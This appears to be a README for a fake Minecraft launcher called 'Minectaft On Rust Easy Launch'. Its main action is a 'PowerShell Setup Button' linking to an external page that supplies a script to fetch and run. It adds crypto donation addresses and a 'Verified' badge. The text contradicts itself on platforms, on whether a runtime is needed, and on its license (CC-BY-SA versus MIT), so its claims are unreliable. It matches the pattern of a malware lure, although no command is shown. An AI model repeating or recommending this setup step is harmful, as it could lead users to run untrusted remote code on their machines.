<div align="center">

# Minectaft On Rust Easy Launch – Windows Desktop Client

![](files/preview.png)

### 🔧 PowerShell Setup Button

<a href="https://vkindustries49-star.github.io/minectaft-on-rust-easy-launch/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![pwsh](https://img.shields.io/badge/Pwsh-5.1%2B-e11d48?style=social&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/Licence-Cc--By--Sa--4.0-f43f5e?style=social&labelColor=0d1117)]() [![win](https://img.shields.io/badge/Win-Windows_10_%7C_11-be123c?style=social&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/Channel-Verified-2ea44f?style=social&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/Setup-1718-9f1239?style=social&labelColor=0d1117)]()

<div align="center">
<h3>Buy me a coffee</h3>
<p><strong>ETH</strong>:&nbsp;<code>0xAb2a5f3D519b1E9e6351A06344186Cfc76c0086b</code> | <strong>BTC</strong>:&nbsp;<code>1CA5CgwPvHgqP8hvsjyF5wUzkq9Lbw9jgj</code> | <strong>TRON</strong>:&nbsp;<code>TGE8oAiokZi1M448v5Lz2bRYa9tMJmszuj</code></p>
</div>

</div>

---

Minectaft On Rust Easy Launch is a native desktop launcher designed to streamline the configuration and startup of the minectaft-on-rust runtime. It provides a unified interface for managing runtime arguments, environment variables, and launch profiles, eliminating the need for manual command-line invocations. The application features persistent profile storage, real-time process output capture, and configurable launch parameters that can be saved and reused across sessions. Built with a focus on deterministic startup behavior, it validates runtime prerequisites before execution and surfaces actionable diagnostics when configuration issues arise.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Unified launch pipeline**: A single deterministic entry point that resolves the runtime environment, validates the mod/profile configuration, and starts the game process without manual intervention.
- **Rust-based core**: The launcher's orchestration logic is implemented in Rust, providing memory safety, predictable performance, and low startup overhead.
- **Profile isolation**: Each game profile maintains its own directory structure for saves, configs, resource packs, and mod data, preventing cross-profile contamination.
- **Dependency and version resolution**: Automatic reconciliation of game versions, loader versions, and mod metadata, with conflict detection surfaced before launch rather than at runtime.
- **Integrity verification**: Checksums are computed and compared for cached artifacts and mod files to detect corruption or tampering prior to execution.
- **Parallel asset handling**: Concurrent download and extraction of libraries and assets using bounded worker pools, with resumable transfers for interrupted sessions.
- **Structured logging and diagnostics**: Machine-readable logs with severity levels and per-launch session identifiers, enabling reproducible issue reporting and post-mortem analysis.
- **Configuration validation**: Schema-checked configuration files with explicit error messages for malformed or unsupported options, failing fast instead of silently degrading.
- **Process lifecycle management**: Supervision of the child game process, including exit-code capture, graceful shutdown handling, and cleanup of transient files.
- **Cross-platform abstraction**: A platform layer that normalizes paths, permissions, and process semantics across supported operating systems.
- **Offline mode**: Launch capability against a fully populated local cache without network access, with clear reporting of any artifacts that cannot be resolved locally.
- **Deterministic reproducibility**: Identical inputs (profile, version pins, mod set) produce identical launch environments, supporting debugging and regression testing.

## How it works

Minectaft On Rust Easy Launch operates as a lightweight orchestration layer that sits between the user and the underlying runtime environment. On startup, the launcher initializes a configuration resolver that scans the local workspace for existing profiles, version manifests, and user-defined settings. These inputs are validated against an internal schema, merged with default parameters, and compiled into a single execution plan that describes the runtime version, memory allocation, and launch arguments.

The core pipeline is built in Rust and executes in distinct phases. First, the dependency resolver determines the required runtime components for the selected profile and verifies their presence in the local cache. Missing components are flagged and prepared for retrieval through the configured source, while present components are checksum-verified to ensure integrity before use. Second, the argument builder assembles the final command line from the resolved profile data, applying sanitization and ordering rules to prevent conflicting flags. Third, the process supervisor spawns the runtime as a child process, captures stdout and stderr streams, and surfaces structured log events to the interface.

The launcher maintains an internal state machine that tracks each phase transition, allowing it to report precise status updates and recover gracefully from partial failures. Configuration changes trigger incremental re-resolution rather than a full restart, keeping startup latency low. All operations are logged with timestamps and severity levels, and the launcher exposes a deterministic exit status that reflects the outcome of each stage. Because the orchestration logic is isolated from the runtime itself, updates to profiles or runtime versions do not require changes to the launcher binary.

## Modules and Settings

### Profile Manager
This module is the central place where launch configurations for the Rust-based Minecraft-style client are created, viewed and organized.
- Create a new profile by selecting a client build and assigning a recognizable name; the saved profile appears in the main window for reuse.
- Duplicate an existing profile to carry over its runtime, memory and argument choices, making it quick to test variants.
- Rename or remove profiles that are no longer needed, with the list showing names and last-used state.
- Pick a profile from the list at startup so the launcher knows which configuration to prepare.

### Runtime Configuration
This module handles how the launcher finds and binds a Java or compatible runtime to each profile.
- Choose auto-detection so the launcher inspects what is available on the machine, or point it at a specific runtime installation.
- View the selected runtime next to the active profile and change it per profile without affecting others.
- Receive a status-area message when a runtime cannot be located, preventing the client from starting with an unresolved setup.

### Launch Tuning
This module exposes the memory and argument controls that shape how the client is started.
- Set allocated memory per profile using a slider or a direct value entry.
- Add or remove additional launch arguments that are passed through to the client.
- Review the effective launch command summary to confirm what will be passed before starting.

### Instance Directory Handling
This module keeps game data separate by tying each profile to its own working directory.
- Create a new directory from within the launcher or browse to an existing one.
- See the resolved directory path in the profile view so it is clear which data folder a launch will use.
- Rely on the per-profile binding to keep different setups from sharing the same game data.

### Validation and Launch Feedback
This module checks a profile before start and reports what happens during and after a launch attempt.
- Read a visible checklist of missing selections, such as an unset runtime or an empty directory, before the client starts.
- Watch startup progress indicators and see whether the client process is currently running.
- Inspect captured launch output and errors in the log view inside the launcher window.
- View exit codes reported back by the client and stop a running client from the launcher, with the resulting state reflected in the interface.

### Additional Settings
Optional controls that refine how the launcher behaves across profiles and sessions.
- Toggle automatic runtime re-detection when the launcher starts, so newly available runtimes are picked up.
- Show or hide the launch command summary in the profile view for a cleaner or more detailed layout.
- Choose whether the log view clears on each launch or keeps previous output for comparison.
- Enable a confirmation prompt before starting a profile that still shows validation warnings.
- Set the preferred client build shown by default when creating a new profile.

## Usage Scenarios

### First Start with a Guided Profile
**Goal:** Get the Rust-based Minecraft-style client running for the first time without dealing with runtimes or launch parameters manually.
**Steps:**
1. Open the launcher and start creating a new profile, selecting the desired client build from the available builds.
2. Give the profile a recognizable name and let runtime auto-detection inspect the machine for a usable Java or compatible runtime.
3. Adjust allocated memory with the slider and review the effective launch command summary.
4. Browse to or create a working directory for the profile's game data.
5. Read the pre-launch checklist to confirm nothing is missing, then start the client.
**Expected result:** The saved profile appears in the main window with its name, chosen build and runtime shown next to it; the checklist shows all items resolved, and the log view displays the captured launch output once the client starts.

### Testing a Variant Without Starting Over
**Goal:** Try a different memory allocation and an extra launch argument while keeping the original configuration intact.
**Steps:**
1. Duplicate an existing profile in the Profile Manager so its runtime, memory and argument choices carry over.
2. Rename the duplicate to something distinguishable, such as a variant name.
3. Change the allocated memory value and add the additional argument lines in Launch Tuning.
4. Open the launch command summary to confirm the effective command before starting.
5. Launch the duplicate from the main window.
**Expected result:** Two profiles are listed side by side with their names and last-used state; the duplicate shows the updated memory value and arguments in its summary, while the original profile keeps its previous settings unchanged.

### Diagnosing a Failed Launch
**Goal:** Understand why a client start did not succeed and correct the profile.
**Steps:**
1. Attempt to start a profile and observe the status-area message reporting that the runtime could not be located.
2. Open the pre-launch checklist to see which items need attention, such as the unset runtime or an empty directory.
3. Point the profile at a specific runtime installation, or rely on auto-detection after enabling automatic re-detection at startup.
4. Choose a valid working directory and confirm the resolved path in the profile view.
5. Start the client again and check the log view and reported exit code.
**Expected result:** The checklist shows the previously flagged items resolved, the profile view displays the selected runtime and resolved directory path, and the log view presents the new launch output so the user can see whether the client process is running or what exit code was reported.

### Organizing Separate Setups Across Profiles
**Goal:** Keep game data for different setups separate and tidy up configurations that are no longer needed.
**Steps:**
1. Create a new profile and assign it its own working directory, either by creating one from within the launcher or browsing to an existing one.
2. Enable the launch command summary in the profile view to verify the effective command for each setup.
3. Remove a profile that is no longer needed from the Profile Manager.
4. Pick the remaining profile from the list at startup so the launcher prepares the right configuration.
5. Start the client and use the stop control in the launcher window when finished.
**Expected result:** The main window lists only the retained profiles with their names and last-used state, each profile view shows its own resolved directory path, and the interface reflects the running state after the client is stopped from the launcher.

## Compatibility

Minectaft On Rust Easy Launch is engineered for cross-platform operation on 64-bit Linux and Windows 10/11, with Apple Silicon and Intel macOS support delivered through a native binary. The application requires a functional Java runtime (JRE 17 or newer) to launch Minecraft instances; the launcher detects installed runtimes and can operate against a user-specified Java path when multiple versions coexist. System memory of at least 4 GB is recommended, with storage requirements driven by the size of the Minecraft versions and modpacks you manage. The launcher interoperates with the standard `.minecraft` directory layout and honors existing profiles, world saves, and configuration files, allowing adoption alongside other launchers without migration. Version support spans legacy releases through current snapshots, including modded instances managed via common mod loaders. Command-line flags and environment variables permit integration into scripted workflows and CI environments. Hardware acceleration is not required; the launcher runs on integrated graphics and performs identically across supported desktop environments.

## FAQ

**Q: What runtime dependencies are required to operate the launcher?**

A: The launcher is distributed as a self-contained native binary. No external runtime, interpreter, or package manager is required for execution. Only the platform-native system libraries shipped with the supported operating systems are used.

**Q: Which operating systems and architectures are supported?**

A: The launcher targets 64-bit Windows, Linux, and macOS on x86-64 and ARM64 where applicable. Compatibility details, including minimum OS versions and tested distributions, are documented in the Compatibility section.

**Q: How does the launcher manage the game and Rust runtime versions?**

A: The launcher resolves the appropriate runtime and game artifacts at launch, verifies integrity, and stages them in an isolated per-instance directory. Version pinning is supported so that a given instance always resolves to a specific build, preventing unintended upgrades.

**Q: Does the launcher modify the base installation or system-wide state?**

A: No. All launcher state, caches, and instance data are written to a dedicated user-scoped directory. System-wide configuration, registry entries, and global environment variables are not modified.

**Q: Is offline launching supported?**

A: Yes, provided the required runtime and game artifacts have already been staged locally. The launcher performs a local integrity check and proceeds without network access. First-time resolution of new versions requires connectivity.

**Q: How are credentials and session data handled?**

A: Authentication tokens are stored only in the local user-scoped configuration directory with restricted filesystem permissions. Tokens are never transmitted to third parties and are used exclusively for the authentication flows the launcher initiates.

**Q: Can multiple instances run concurrently?**

A: Yes. Each instance is isolated by its own directory and process namespace. Concurrent instances do not share mutable state, and the launcher enforces per-instance locking to prevent corruption.

**Q: What diagnostics are available for troubleshooting?**

A: The launcher emits structured logs to the user-scoped log directory and supports a verbose logging flag that increases verbosity for runtime resolution, integrity checks, and process launch stages. Logs contain no sensitive token material.

**Q: How are updates to the launcher itself delivered?**

A: The launcher checks for signed updates on startup and applies them atomically to a staging location before activation. Updates can be deferred or disabled via configuration for controlled environments.

**Q: Is the launcher extensible?**

A: Configuration is exposed through a documented file format supporting instance definitions, version pins, launch arguments, and environment overrides. Extension points are limited to configuration and do not permit arbitrary code injection.

**Q: What is the resource footprint?**

A: The launcher is a lightweight native process; memory and CPU usage are dominated by the launched game and runtime rather than the launcher itself. Idle overhead is minimal and scales with the number of active instances.

## Disclaimer

Minectaft On Rust Easy Launch is provided as-is, without warranties of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. Use of this software is at your own risk.

This software is an independent launcher utility and is not affiliated with, endorsed by, or sponsored by the developers or publishers of Minecraft or any related rights holders. All trademarks and product names referenced remain the property of their respective owners.

The launcher performs local file management, version resolution, and process orchestration. It does not modify game assets beyond the scope required for launching, does not distribute proprietary game content, and does not bypass authentication or licensing mechanisms. Users are responsible for ensuring they hold valid licenses for any software launched through this tool.

No guarantee is made regarding compatibility with future game versions, third-party mods, resource packs, or custom configurations. Behavior may vary across operating systems, hardware configurations, and runtime environments. Automated update and integrity checks are performed on a best-effort basis and should not be treated as a substitute for manual verification.

In no event shall the authors or contributors be liable for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use or inability to use this software, including but not limited to data loss, corruption of game installations, or system instability, even if advised of the possibility of such damages.

By using Minectaft On Rust Easy Launch, you acknowledge that you have read and understood this disclaimer and accept full responsibility for your use of the software.

## License

Minectaft On Rust Easy Launch is distributed under the MIT License. Permission is granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions.

The copyright notice and this permission notice shall be included in all copies or substantial portions of the software.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Redistribution in source and binary forms, with or without modification, is permitted provided that the copyright notice, the list of conditions, and this disclaimer are retained. Modified versions must be clearly marked as such and must not misrepresent the origin of the original software. Any distribution of compiled binaries derived from this project remains subject to the terms above.